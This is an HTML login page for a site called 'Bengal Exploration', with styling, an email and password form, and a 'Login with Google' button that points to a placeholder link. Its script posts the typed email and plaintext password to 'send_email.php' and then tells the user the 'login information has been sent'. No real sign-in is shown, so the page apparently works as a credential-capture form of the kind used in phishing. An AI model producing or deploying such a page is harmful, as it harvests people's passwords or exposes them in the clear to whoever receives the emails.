<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Bengal Exploration</title>
    <style>
        body {
            font-family: 'Times New Roman', serif;
            background-color: #000000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #222;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 300px; /* Adjust width as needed */
        }

        h2 {
            margin-bottom: 20px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
        }

        .btn {
            background-color: #ff4081;
            color: white;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.3s ease;
            width: 100%;
            margin-top: 10px;
        }

        .btn:hover {
            background-color: #ff80ab;
            transform: scale(1.05);
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }

        .footer-links a {
            color: white;
            text-decoration: none;
            margin: 0 10px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login</h2>
        
        <form id="loginForm">
            <input type="email" placeholder="Email" id="email" required>
            <input type="password" placeholder="Password" id="password" required>
            <button type="submit" class="btn">Login</button>
        </form>
        
        <button class="btn" onclick="location.href='YOUR_LOGIN_PAGE_LINK'">Login with Google</button>
        
        <div class="footer-links">
            <a href="index.html">Return to Home</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').onsubmit = function(event) {
            event.preventDefault(); // Prevent form submission

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Send data to the server
            fetch('send_email.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => {
                if (response.ok) {
                    alert('Login information has been sent successfully!');
                    // Redirect to another page or perform other actions
                    window.location.href = "index.html"; // Redirect to home page after submission
                } else {
                    alert('Error sending login information. Status: ' + response.status);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending login information. Please check the console for details.');
            });
        };
    </script>

</body>
</html>
